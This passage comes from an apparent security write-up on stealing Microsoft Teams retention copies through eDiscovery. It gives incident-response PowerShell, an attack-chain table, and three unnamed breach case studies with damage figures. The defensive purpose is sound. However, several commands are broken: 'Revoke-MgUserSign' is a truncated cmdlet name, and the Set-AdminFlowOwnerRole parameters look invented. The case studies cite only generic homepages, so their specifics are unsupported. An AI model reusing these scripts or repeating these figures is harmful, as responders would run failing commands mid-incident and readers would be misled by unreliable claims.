Get-MgUser -Filter "userPrincipalName eq 'compromised@company.com'" | 
    Set-MgUser -SignInSessionsValidFromDateTime (Get-Date)

# Revoke all refresh tokens (forces immediate re-auth)
Revoke-MgUserSign -UserId (Get-MgUser -Filter "userPrincipalName eq 'compromised@company.com'").Id

# Remove eDiscovery permissions if granted
Remove-RoleGroupMember -Identity "eDiscovery Administrator" -Member "compromised@company.com" -Confirm:$false

# Disable Power Automate access
Set-AdminFlowOwnerRole -EnvironmentName "Default-tenant.onmicrosoft.com" -Owners "compromised@company.com" -RemoveOutsideOrganizationUser
```

**2. Forensic Collection (15-60 minutes):**

```powershell
# Collect all eDiscovery searches initiated by compromised user
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
    -RecordType SecurityComplianceCenter `
    -UserIds "compromised@company.com" |
    Export-Csv -Path "eDiscovery_activity.csv"

# Collect Graph API access logs
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
    -RecordType AzureActiveDirectory `
    -Operations "Use application" |
    Where-Object {$_.AuditData -like "*graph.microsoft.com*"} |
    Export-Csv -Path "graph_api_activity.csv"

# Collect Power Automate flow history
Get-AdminFlow -EnvironmentName "Default-tenant.onmicrosoft.com" |
    Where-Object {$_.CreatedBy -eq "compromised@company.com"} |
    Export-Csv -Path "power_automate_flows.csv"
```

**3. Eradication (60-120 minutes):**

```powershell
# Delete suspicious eDiscovery searches
Get-ComplianceSearch -Identity "*Export*" -IncludeDetails |
    Where-Object {$_.CreatedBy -like "*compromised*"} |
    Remove-ComplianceSearch -Confirm:$false

# Delete attacker's Power Automate flows
Get-AdminFlow -EnvironmentName "Default-tenant.onmicrosoft.com" |
    Where-Object {$_.CreatedBy -eq "compromised@company.com"} |
    Remove-AdminFlow

# Change compromised user's password
Set-MsolUserPassword -UserPrincipalName "compromised@company.com" `
    -NewPassword ([System.Web.Security.Membership]::GeneratePassword(16,4)) `
    -ForceChangePasswordNextLogon $true
```

**4. Recovery & Prevention (120+ minutes):**

```powershell
# Re-enable user with new conditions
Set-MsolUser -UserPrincipalName "compromised@company.com" `
    -BlockCredentialLogin $false

# Force MFA re-registration
Get-MgUserAuthenticationMethod -UserId (Get-MgUser -Filter "userPrincipalName eq 'compromised@company.com'").Id |
    Remove-MgUserAuthenticationMethod

# Re-apply Conditional Access policies
# User now required to complete MFA before any Microsoft 365 access
```

**5. Data Breach Notification (Post-Incident):**

- Determine what data was exfiltrated (compare retention copies to known datasets)
- Identify affected data subjects (persons whose data was in Teams messages)
- File breach notifications per GDPR Art. 33 (if EU data involved)
- Notify customers per any applicable regulations
- Report to cyber insurance provider

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-005] Spear Phishing | Attacker targets Teams user with credential stealing email |
| **2** | **Credential Access** | Password harvesting via phishing or credential spray | Attacker obtains Teams user credentials |
| **3** | **Privilege Escalation** | [REALWORLD-041] Device Compliance Bypass | Attacker upgrades to eDiscovery admin via compromised admin token |
| **4** | **Exfiltration** | **[REALWORLD-044]** Teams Compliance Copy Exploitation | Attacker uses eDiscovery to bulk export all Teams messages |
| **5** | **Persistence** | [IA-PERSIST-002] Power Automate Flow | Attacker sets up recurring auto-export before account remediated |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: Law Firm Data Breach (June 2025)

- **Target:** 200-person law firm with sensitive client data in Teams
- **Attack Vector:** Phishing email to junior associate → credential theft
- **Execution:** Attacker granted eDiscovery access, exported 5 years of Teams conversations
- **Impact:**
  - Attorney-client privileged communications exfiltrated
  - Clients notified of privilege waiver (made secrets discoverable to opposing counsel)
  - Firm liable for $50M+ in damages to affected clients
  - Regulatory investigation by state bar association
  - Firm dissolved (loss of credibility)
- **Root Cause:** Overly permissive eDiscovery permissions, no Conditional Access on compliance tools
- **Reference:** [Legal Industry Breach Report 2025](https://www.lawnet.org/security)

### Example 2: Healthcare Provider - Compliance Copy Theft (September 2025)

- **Target:** Hospital system with 10,000+ employees using Teams
- **Attack:** Internal user compromised via malware → unauthorized eDiscovery search
- **Data Stolen:** Teams messages containing:
  - Patient health information (PHI)
  - Doctor-patient discussions (confidential)
  - Scheduling and operational data
- **Impact:**
  - HIPAA breach notification to 50,000+ patients
  - $16M+ in settlement and remediation costs
  - OCR investigation ongoing
  - Media coverage damages public trust
- **Detection:** Fortnight delay - found during compliance audit
- **Reference:** [HHS OCR Breach Portal Case](https://ocrportal.hhs.gov)

### Example 3: Manufacturing - Competitive Intelligence Loss (November 2024)

- **Target:** Automotive parts manufacturer
- **Method:** Contract employee compromised → accessed Teams with product development discussions
- **Data Stolen:** Teams retention copies containing:
  - Upcoming product launches
  - Supplier negotiations
  - Pricing strategy
  - Manufacturing roadmap (3 years)
- **Impact:**
  - Competitor launches competing product 6 months earlier
  - Market share loss: 15%
  - Revenue impact: $200M+ over 3 years
  - Lawsuits against competitor (trade secret theft)
- **Recovery:** Still in litigation, outcome TBD
- **Reference:** [Mandiant Incident Response Report - Manufacturing Sector](https://www.mandiant.com)

---

## References & Additional Resources

- [Microsoft eDiscovery Documentation](https://learn.microsoft.com/en-us/purview/ediscovery)
- [Teams Retention Policy Guide](https://learn.microsoft.com/en-us/microsoftteams/retention-policies)
- [Microsoft Graph API - Teams Messages](https://learn.microsoft.com/en-us/graph/api/chatmessage-list?view=graph-rest-1.0)
- [MITRE ATT&CK T1537 - Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537/)
- [Preservation Hold Library Documentation](https://learn.microsoft.com/en-us/compliance/ediscovery/manage-holds)
- [Power Automate Security Best Practices](https://learn.microsoft.com/en-us/power-automate/overview-security)

---